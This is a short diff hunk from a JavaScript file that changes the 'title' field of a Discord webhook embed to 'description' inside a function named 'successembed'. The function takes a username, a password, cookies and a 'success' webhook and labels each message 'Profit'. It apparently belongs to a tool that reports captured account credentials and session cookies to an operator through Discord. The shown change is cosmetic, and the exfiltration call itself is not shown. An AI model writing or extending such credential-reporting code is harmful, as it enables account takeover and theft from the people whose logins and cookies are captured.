@@ -549,7 +549,7 @@ async function successembed(rusername, rpassword, cookies, successwebhook, sessi
             username: "Virizon X - Bot",
             avatar_url: "",
             embeds: [{
-                title: `<@${discord_id}> Profit`,
+                description: `<@${discord_id}> Profit`,
                 timestamp: new Date().toISOString(),
                 color: parseInt("34eb8c", 16),
                 footer: {
